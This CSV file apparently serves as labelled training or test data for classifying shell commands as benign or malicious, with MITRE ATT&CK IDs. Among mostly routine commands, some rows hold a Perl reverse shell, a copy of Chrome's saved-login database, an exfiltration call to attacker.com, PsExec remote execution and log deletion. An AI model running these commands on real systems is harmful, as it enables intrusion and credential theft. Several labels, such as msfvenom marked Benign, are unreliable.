command,label,original_label,mitre_id
"import-module ""$file_path\timestomp.ps1""",Malicious,Malicious,T1070
"ani-cli [-v|--vlc] ""anime_title""",Benign,Benign,Benign
"""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"" \\$target -accepteula -s ""cmd.exe""",Malicious,Malicious,T1053
tmpmail [-t|--text],Benign,Benign,Benign
gpupdate /?,Benign,Benign,Benign
networkctl,Benign,Benign,Benign
sudo semanage login [-d|--delete] linux_username,Benign,Benign,Benign
du -sh path/to/directory,Benign,Benign,Benign
bmptopnm path/to/file.bmp,Benign,Benign,Benign
eselect news count all|new,Benign,Benign,Benign
hledger print,Benign,Benign,Benign
sudo perf report,Benign,Benign,Benign
hostname,Benign,Benign,Benign
sudo delpart /dev/sda 1,Benign,Benign,Benign
installer [-pkg|-package] path/to/package.pkg -showChoiceChangesXML,Benign,Benign,Benign
rpm [-q|--query] httpd,Benign,Benign,Benign
dhclient -sf /bin/sh,Malicious,Malicious,T1059
matchpathcon -V /path/to/file,Benign,Benign,Benign
diff -u file1 file2,Benign,Benign,Benign
eb logs,Malicious,Malicious,T1548
"cp ~/Library/""Application Support/Google/Chrome/Default/Login Data"" ""/tmp/T1555.003_Login Data""",Malicious,Malicious,T1555
chgrp [-h|--no-dereference] group path/to/symlink,Benign,Benign,Benign
bzip2 -kv */*/*/*/*/*/*,Benign,Benign,Benign
if($restart){,Malicious,Malicious,T1547
sudo smartctl [-c|--capabilities] /dev/sdX,Benign,Benign,Benign
prqlc compile,Benign,Benign,Benign
curl file:///path/to/temp-file -o /path/to/output-file,Malicious,Malicious,T1222
"git fame --since ""3 weeks ago|2021-05-13""",Benign,Benign,Benign
find . -newer /reference/file,Benign,Benign,Benign
jmtpfs path/to/directory,Benign,Benign,Benign
find /home -name filename.txt,Context_Dependent,Benign,Benign
unrtf --text path/to/file.rtf,Benign,Benign,Benign
RtlCreateUserThread,Malicious,Malicious,T1055
Ventoy2Disk VTOYCLI /U /Drive:D:,Benign,Benign,Benign
sysctl -a 2>/dev/null | wc -l,Context_Dependent,Synthetic,Synthetic
dirb http://10.0.0.10,Context_Dependent,Synthetic,Synthetic
ssh -L 5432:localhost:5432 user@10.0.0.1,Context_Dependent,Synthetic,Synthetic
caddy run --config path/to/Caddyfile,Benign,Benign,Benign
tldr tsort,Benign,Benign,Benign
ollama pull model,Benign,Benign,Benign
emacsclient [-c|--create-frame] path/to/file,Benign,Benign,Benign
sublist3r --domain domain_name --output path/to/output_file,Benign,Benign,Benign
sgitopnm [-c|-channel] n path/to/input.sgi > path/to/output.pnm,Benign,Benign,Benign
sudo netselect-apt [-n|--non-free],Benign,Benign,Benign
find . -iname '*.jpg' -type f -printf +%b,Benign,Benign,Benign
bugreportz -p,Benign,Benign,Benign
makoctl invoke,Benign,Benign,Benign
create partition primary,Benign,Benign,Benign
find /var/www -type d -mtime 0 -name logs -exec sudo rm -fr {} \;,Benign,Benign,Benign
"find / -maxdepth 1 -xdev -type f -print -exec grep -i ""stringtofind"" -q {} \;",Context_Dependent,Benign,Benign
bup [-d|--bup-dir] path/to/repository restore [-C|--outdir] path/to/target_directory backup_name,Benign,Benign,Benign
mv [-i|--interactive] path/to/source path/to/target,Benign,Benign,Benign
clock show interfaces,Benign,Benign,Benign
windows\system32\,Malicious,Malicious,T1053
qm [di|disk] [i|import] vm_id path/to/disk storage_name --format qcow2|raw|vmdk,Benign,Benign,Benign
sudo mke2fs -t ext2 /dev/sdXY,Benign,Benign,Benign
Get-Alias | Out-String -Stream,Benign,Benign,Benign
pueue enqueue task_id task_id,Benign,Benign,Benign
pnmgamma [-ga|-gamma] value path/to/image.pnm > path/to/output.pnm,Benign,Benign,Benign
systemd-socket-activate path/to/socket.service [-l|--listen] 8080,Benign,Benign,Benign
"perl -e 'use Socket;$i=""10.0.0.5"";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"")'",Malicious,Synthetic,Synthetic
lscpu --json,Context_Dependent,Synthetic,Synthetic
trawl -f wi,Benign,Benign,Benign
find /home -name '*.key' -type f 2>/dev/null,Context_Dependent,Synthetic,Synthetic
"find -maxdepth 1 -name '*.sql' -exec sed -e 's/ , );/1,1);/g' '{}' + | mysql -D ootp",Benign,Benign,Benign
pg_receivewal [-D|--directory] directory,Benign,Benign,Benign
ftp -A host,Benign,Benign,Benign
dnsmasq --conf-script='/path/to/command 1>&2',Malicious,Malicious,T1059
hcitool lq bdaddr,Benign,Benign,Benign
find . -mmin -60 -type f -exec ls -l {} +,Benign,Benign,Benign
yadm clone remote_repository_location -b branch,Benign,Benign,Benign
<Ctrl b><w>,Benign,Benign,Benign
which tar,Context_Dependent,Synthetic,Synthetic
jps -v,Benign,Benign,Benign
", command -with -flags",Benign,Benign,Benign
pnmtofiasco [-q|--quality] quality_level path/to/file.pnm > path/to/file.fiasco,Benign,Benign,Benign
taskkill,Malicious,Malicious,T1489
jj new revision,Benign,Benign,Benign
LastWriteTime,Malicious,Malicious,T1070
eza --git-ignore,Benign,Benign,Benign
hexo new layout title,Benign,Benign,Benign
aws kafka describe-cluster --cluster-arn cluster_arn,Benign,Benign,Benign
postconf -d,Benign,Benign,Benign
box validate,Benign,Benign,Benign
webstorm --line line_number path/to/file,Benign,Benign,Benign
mktemp -d,Benign,Benign,Benign
ots new -x number_of_hoursh,Benign,Benign,Benign
zapier versions [-a|--all],Benign,Benign,Benign
iam.serviceAccountUser,Malicious,Malicious,T1548
echo $(echo $ENCODED) | base64 -d,Malicious,Malicious,T1140
[ $(find your/dir -prune -empty) = your/dir ],Benign,Benign,Benign
if ([string]::IsNullOrWhiteSpace($fileContent)) {,Malicious,Malicious,T1560
sudo find /path/to/someDirectory -type f -print0 | xargs -0 sudo chmod 644,Benign,Benign,Benign
truss -p pid,Benign,Benign,Benign
sudo aa-unconfined --paranoid,Benign,Benign,Benign
"sync --list-only --include ""*2012*.xml"" -exclude ""*.xml"" serveripaddress::pt/dir/files/ --port=111 | awk '{ $1=$2=$3=$4=""""; print substr($0,5); }' >output.txt",Benign,Benign,Benign
tlsx [-u|-host] host [-ve|-version-enum] [-ce|-cipher-enum],Benign,Benign,Benign
git branch [-a|--all] --contains commit_hash,Benign,Benign,Benign
gdu --ignore-dirs-pattern '.*[abc]+',Benign,Benign,Benign
"find . -name ""*.html"" -print | xargs -l -i wc {}",Benign,Benign,Benign
pixterm path/to/file,Benign,Benign,Benign
yes n | gunzip file*.gz,Benign,Benign,Benign
showmount -e server_address,Benign,Benign,Benign
"arch -x86_64 ""command""",Context_Dependent,Benign,Benign
MIXER,Benign,Benign,Benign
in-toto-sign [-f|--file] root.layout [-g|--gpg],Benign,Benign,Benign
yarn why module_name,Benign,Benign,Benign
npm publish --access restricted,Benign,Benign,Benign
msfvenom [-p|--payload] linux/x64/meterpreter/reverse_tcp LHOST=local_ip LPORT=local_port [-f|--format] elf [-o|--out] path/to/binary,Benign,Benign,Benign
"find . -name "".aux""",Benign,Benign,Benign
i2cdetect -l,Benign,Benign,Benign
mh_lint path/to/file.m,Benign,Benign,Benign
kpartx -d whole_disk.img,Benign,Benign,Benign
diff path/to/file1 path/to/file2 | diffstat -t,Benign,Benign,Benign
"echo ""<line>"" | cut -d "";"" -f 1",Benign,Benign,Benign
"find . -type d -name "".*""",Benign,Benign,Benign
mv Tux.png .Tux.png,Benign,Benign,Benign
git graft source_branch target_branch,Benign,Benign,Benign
pamtotga -cmap|cmap16|mono|rgb path/to/file.pam > path/to/output.tga,Benign,Benign,Benign
xbps-query [-S|--show] package,Benign,Benign,Benign
ogrmerge.py -f GPKG -o path/to/output.gpkg path/to/input1.shp path/to/input2.shp ...,Benign,Benign,Benign
su -c 'chpass -p encrypted_password username',Benign,Benign,Benign
ghost start,Benign,Benign,Benign
Start-Sleep -s 30,Malicious,Malicious,T1098
bun pm pack --gzip-level 5,Benign,Benign,Benign
pypy -m pdb path/to/file.py,Benign,Benign,Benign
jrnl today at 3am: title. content,Benign,Benign,Benign
kinit -p principal@REALM,Benign,Benign,Benign
php artisan make:model ModelName --all,Benign,Benign,Benign
nvcc path/to/source.cu [-o|--output-file] path/to/executable [-g|--debug] [-G|--device-debug],Benign,Benign,Benign
etcdctl get my/key,Benign,Benign,Benign
rake --rakefile path/to/Rakefile,Benign,Benign,Benign
rm -f ~/.android/adbkey ~/.android/adbkey.pub,Benign,Benign,Benign
find . -type f -mtime +7 -mtime -14 | xargs tar -cvf `date ‘+%d%m%Y’_archive.tar`,Benign,Benign,Benign
distcc gcc -c path/to/source.c -o path/to/output.o,Benign,Benign,Benign
prt-get sysup,Benign,Benign,Benign
gpasswd [-a|--add] user group,Benign,Benign,Benign
sattach --output|error-filter task_number,Benign,Benign,Benign
find . -name '.svn' -prune -o -type f -printf '%m%c%p' | md5sum,Benign,Benign,Benign
gh variable [ls|list] [-o|--org] organization,Benign,Benign,Benign
viewnior --fullscreen path/to/image.ext,Benign,Benign,Benign
zile +line_number path/to/file,Benign,Benign,Benign
sort path/to/file | uniq [-c|--count] | sort [-nr|--numeric-sort --reverse],Benign,Benign,Benign
xml [el|elements] -a path/to/input.xml|URI > path/to/elements.xpath,Benign,Benign,Benign
echo $SSH_CLIENT,Context_Dependent,Synthetic,Synthetic
wiggle path/to/file.patch,Benign,Benign,Benign
lebab --help,Benign,Benign,Benign
sudo deluser username,Benign,Benign,Benign
shopt -u nullglob,Benign,Benign,Benign
gh secret [ls|list],Benign,Benign,Benign
traefik --web,Benign,Benign,Benign
httpsvc,Malicious,Malicious,T1543
mpicc -o executable path/to/object_file.o,Benign,Benign,Benign
py python_arguments,Benign,Benign,Benign
tracert /4 IP,Benign,Benign,Benign
gcloud compute instances list,Benign,Benign,Benign
cluster -o output.gv input.gv,Benign,Benign,Benign
larasail mysqlpass,Benign,Benign,Benign
mosquitto [-d|--daemon],Benign,Benign,Benign
putty -help,Benign,Benign,Benign
Get-ManagementRoleAssignment,Context_Dependent,Malicious,T1069
expand path\to\file.cab path\to\directory -i,Benign,Benign,Benign
docker buildx prune --reserved-space 2gb,Benign,Benign,Benign
"""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"" \\$remote_host -i -u $user_name -p $password -accepteula ""C:\Windows\System32\calc.exe""",Malicious,Malicious,T1569
sl -F,Benign,Benign,Benign
idevicedate --set timestamp,Benign,Benign,Benign
sudo steamos-update,Benign,Benign,Benign
sudo nft list ruleset,Benign,Benign,Benign
lsar [-L|--verylong] path/to/archive,Benign,Benign,Benign
jp2a path/to/image.jpeg,Benign,Benign,Benign
zlib,Malicious,Malicious,T1132
pro security-status --unavailable,Benign,Benign,Benign
solo monitor path/to/serial_port,Benign,Benign,Benign
kubens,Benign,Benign,Benign
llvm-as --module-hash -o path/to/out.bc path/to/source.ll,Benign,Benign,Benign
warp-diag,Benign,Benign,Benign
"bedtools groupby -i path/to/file -c 1-3,5 -g 6 -o sum",Benign,Benign,Benign
wal-telegram --background=path/to/image,Benign,Benign,Benign
pamfile [-a|-allimages] -machine path/to/file,Benign,Benign,Benign
find -cmin -5 | less -R,Benign,Benign,Benign
kubectl kustomize path/to/directory > output.yaml,Benign,Benign,Benign
blkdiscard [-s|--secure] /dev/device,Benign,Benign,Benign
git undo,Benign,Benign,Benign
lpass show myinbox --password,Benign,Benign,Benign
kompose down [-f|--file] docker-compose.yml,Benign,Benign,Benign
velero backup delete backup_name,Benign,Benign,Benign
watch --color 'tput setaf 1; echo foo',Benign,Benign,Benign
"Invoke-WebRequest $domain -UserAgent ""Opera/8.81 (Windows NT 6.0; U; en)"" | out-null",Malicious,Malicious,T1071
waydroid show-full-ui,Benign,Benign,Benign
conda compare [-h|--help],Benign,Benign,Benign
upnpc -a 192.168.0.1 8080 80 tcp,Benign,Benign,Benign
cat /var/log/cron,Context_Dependent,Synthetic,Synthetic
"echo ""$IFS""",Benign,Benign,Benign
"Write-Output ""Function code upload failed.""",Malicious,Malicious,T1528
docker service scale service_name=count_of_replicas,Benign,Benign,Benign
dirs -v,Benign,Benign,Benign
find * /home/www -type f,Benign,Benign,Benign
circup update,Benign,Benign,Benign
zeroclaw gateway [-h|--help],Benign,Benign,Benign
arecord [-l|--list-devices],Benign,Benign,Benign
gdown --fuzzy url,Benign,Benign,Benign
smbmap [-u|--username] username [-p|--password] password -d domain -H ip_or_hostname,Benign,Benign,Benign
git show-branch branch_name1|ref1|commit1 branch_name2|ref2|commit2 ...,Benign,Benign,Benign
hyprshot [-m|--mode] output,Benign,Benign,Benign
npm test | gnomon [-t|--type] elapsed-total,Benign,Benign,Benign
sudo update-ca-certificates,Benign,Benign,Benign
gcloud projects create project_id|project_number,Benign,Benign,Benign
sudo srm -r $system_log_folder #recursive deletion of log files,Malicious,Malicious,T1070
poetry list namespace,Benign,Benign,Benign
msginit [-l|--locale] locale [-i|--input] path/to/messages.pot,Benign,Benign,Benign
kaggle [c|competitions] list,Benign,Benign,Benign
"vinmap [-ip|--ip_range] 192.168.1.1,192.168.1.2,...",Benign,Benign,Benign
cam [-c|--camera] camera_index --list-controls,Benign,Benign,Benign
secretsdump.py -no-pass domain/username@target,Benign,Benign,Benign
krdc,Benign,Benign,Benign
echo 'import os' >> $python_script_name,Malicious,Malicious,T1059
"find . ! -path ""*/test/*"" -type f -name ""*.js"" ! -name ""*-min-*"" ! -name ""*console*""",Benign,Benign,Benign
"find -maxdepth 1 -name '*.sql' -exec sed -e 's/ , );/1,1);/g' '{}' | mysql -D ootp",Benign,Benign,Benign
file $(which foo),Benign,Benign,Benign
chgrp -R git .git,Benign,Benign,Benign
now remove deployment_id,Benign,Benign,Benign
"New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name ""COR_PROFILER_PATH"" -PropertyType String -Value ""$file_name"" -Force | Out-Null",Malicious,Malicious,T1574
brotli path/to/file [-o|--output] path/to/compressed_output_file.br,Benign,Benign,Benign
ppmntsc --pal path/to/input_file.ppm > path/to/output_file.ppm,Benign,Benign,Benign
systemctl start lldpd,Benign,Benign,Benign
pio system prune --dry-run,Benign,Benign,Benign
ldd [-u|--unused] path/to/binary,Benign,Benign,Benign
idevicecrashreport --extract path/to/directory,Benign,Benign,Benign
react-native run-android --variant=release,Benign,Benign,Benign
pipewire-pulse [-h|--help],Benign,Benign,Benign
source <(./script.sh | sed -rn '/volume/{s#/dev/([^[:space:]]+)[[:space:]]+#\1=#;p}'),Benign,Benign,Benign
apktool if path/to/framework.apk,Benign,Benign,Benign
cancel -h attacker.com:12345 -u DATA,Malicious,Malicious,T1105
shred -v -n 1 /path/to/your/file #overwriting with random data,Benign,Benign,Benign
msfconsole,Malicious,Malicious,T1548
mariadb db_name,Benign,Benign,Benign
kde-builder --install-login-session-only,Benign,Benign,Benign
head -20 /etc/hostname,Context_Dependent,Synthetic,Synthetic
pamslice [-c|-column] n path/to/image.pam,Benign,Benign,Benign
firewallsd,Malicious,Malicious,T1562
pdftohtml -xml path/to/file.pdf path/to/output_file.xml,Benign,Benign,Benign
"ippeveprinter -s speed ""service_name""",Benign,Benign,Benign
du -sb,Benign,Benign,Benign
"find /user/directory/* -name ""*txt"" -mtime 0 -type f",Benign,Benign,Benign
py-spy record [-o|--output] path/to/profile.svg [-p|--pid] pid,Benign,Benign,Benign
robo list,Benign,Benign,Benign
retry [-d|--delay] n command,Benign,Benign,Benign
cosign sign --key cosign.key image,Benign,Benign,Benign
cat /etc/network/interfaces,Context_Dependent,Synthetic,Synthetic
pw-config [-n|--name] pipewire.conf [-r|--recurse] merge context.modules,Benign,Benign,Benign
tv list-channels,Benign,Benign,Benign
flutterfire configure,Benign,Benign,Benign
pylint package_or_module,Benign,Benign,Benign
"find / -name ""*.php"" -print -o -path '/media' -prune",Context_Dependent,Benign,Benign
es -sort name-ascending,Benign,Benign,Benign
find . -name \*.coffee -exec grep -m1 -i 're' {} \;,Benign,Benign,Benign
sh5util [-j|--jobs] job_id|job_id.step_id [-I|--item-extract] [-s|--series] Energy|Filesystem|Network|Task [-d|--data] data_item,Benign,Benign,Benign
"stop-process -name ""chrome"" -force -erroraction silentlycontinue",Malicious,Malicious,T1539
mg -n path/to/file,Benign,Benign,Benign
fabric [-p|--pattern] pattern1 | fabric [-p|--pattern] pattern2,Benign,Benign,Benign
"Compress-Archive -Path path\to\file1, path\to\file2, ... -DestinationPath path\to\files.zip",Benign,Benign,Benign
foreach ($port in $ports) {,Context_Dependent,Malicious,T1016
reflex [-G|--inverse-regex] '^dir/' command,Benign,Benign,Benign
public static void Main(string[] args) {,Malicious,Malicious,T1036
$which_python $python_binary_name,Malicious,Malicious,T1059
find . -type f -exec cp {} /tmp +,Benign,Benign,Benign
cf bind-service app_name service_name,Benign,Benign,Benign
kill $PID,Benign,Benign,Benign
"Invoke-Maldoc -macroFile ""$txt_path"" -officeProduct ""Word"" -sub ""Execute""",Malicious,Malicious,T1055
dphys-swapfile swapon,Benign,Benign,Benign
steamos-select-branch beta,Benign,Benign,Benign
"[ -z ""$variable"" ]",Benign,Benign,Benign
find /path/to/search -xtype l,Benign,Benign,Benign
tlmgr backup clean package1 package2 ...,Benign,Benign,Benign
fastapi --help,Benign,Benign,Benign
yes yes | sed -e 5s/yes/no/ -e 5q,Benign,Benign,Benign
pip wheel [-r|--requirement] path/to/requirements.txt,Benign,Benign,Benign
boltctl enroll device_uuid,Benign,Benign,Benign
xcopy path\to\file_or_directory path\to\destination_directory,Benign,Benign,Benign
cat --version,Benign,Benign,Benign
sudo vgextend vg1 /dev/sda1,Benign,Benign,Benign
